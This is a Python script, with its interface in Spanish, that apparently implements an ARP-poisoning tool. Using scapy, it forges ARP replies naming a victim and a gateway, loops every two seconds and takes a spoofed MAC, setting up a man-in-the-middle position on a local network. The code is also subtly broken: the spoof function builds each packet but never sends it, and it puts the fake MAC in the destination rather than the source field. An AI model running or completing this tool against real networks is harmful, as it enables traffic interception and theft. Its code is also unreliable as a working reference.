import scapy.all as scapy
from termcolor import colored
import argparse
import time
import sys
import signal

def def_handler(sig, frame):
   print(colored('[!] Finalizando...', 'yellow'))
   sys.exit(0)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
   parse = argparse.ArgumentParser(description="Envenenador ARP")
   parse.add_argument('-t', '--target', dest='target', help='IP de la victima: (ej: 192.168.1.2)')
   parse.add_argument('-g', '--gateway', dest='gateway', help='IP del gateway: (ej: 192.168.1.1)')
   parse.add_argument('-m', '--mac', dest='mac', help='MAC falso: (ej: 00:11:22:33:44:55)')

   args = parse.parse_args()
   if args.target is None or args.gateway is None or args.mac is None:
      parse.print_help()
      sys.exit(0)
   return args.target, args.gateway, args.mac

def spoof(target_victima, ip_gateway, mac_falso):
   arp_packet = scapy.ARP(op=2, pdst=target_victima, psrc=ip_gateway,hwdst=mac_falso)

def main():
   target_victima, ip_gateway, mac_falso = get_arguments()
   
   print(colored(f'[+] Envenenando ARP esta corriendo, victima: {target_victima}, MAC falso: {mac_falso}' , 'green'))
   while True:
      spoof(target_victima, ip_gateway, mac_falso)
      spoof(ip_gateway, target_victima, mac_falso)
      time.sleep(2)


if __name__ == "__main__":
   main()
   print(colored('[+] Envenenando ARP finalizado', 'yellow'))